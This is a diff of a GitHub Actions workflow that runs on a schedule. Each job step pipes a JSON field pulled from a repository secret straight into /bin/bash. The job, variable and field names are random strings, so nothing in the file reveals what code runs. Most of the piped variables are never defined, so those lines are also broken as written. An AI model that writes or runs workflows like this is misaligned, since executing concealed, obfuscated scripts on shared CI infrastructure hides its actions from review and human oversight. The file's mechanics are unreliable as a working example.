@@ -3,7 +3,8 @@ name: zhuanyemuqian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 3/6 * * *'
+    - cron: '8 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhuanyemuqian
         env:
-          gy5: ${{ secrets.gy5 }}
+          thlws1: ${{ secrets.thlws1 }}
         run: |
-          echo $gy5 | jq -r .xiyq9443 | /bin/bash
-          echo $ewvxn052 | jq -r .yiq0 | /bin/bash
-          echo $n6 | jq -r .ovkwj6094 | /bin/bash
-          echo $svnrv1019 | jq -r .ec340 | /bin/bash
-          echo $bml06 | jq -r .zzn51108 | /bin/bash
-          echo $ogxi15644 | jq -r .hrjya34 | /bin/bash
-          echo $rmgef28500 | jq -r .qq00215 | /bin/bash
-          echo $y21829 | jq -r .emrp624 | /bin/bash
-          echo $ui0 | jq -r .wlldf68 | /bin/bash
-          echo $xkqkb8 | jq -r .s295 | /bin/bash
+          echo $thlws1 | jq -r .mw35723 | /bin/bash
+          echo $uyng39534 | jq -r .igbka234 | /bin/bash
+          echo $t4 | jq -r .ngno968 | /bin/bash
+          echo $ljm163 | jq -r .mi0988 | /bin/bash
+          echo $rnv4 | jq -r .yetu948 | /bin/bash
+          echo $tb2 | jq -r .evfp0 | /bin/bash
 
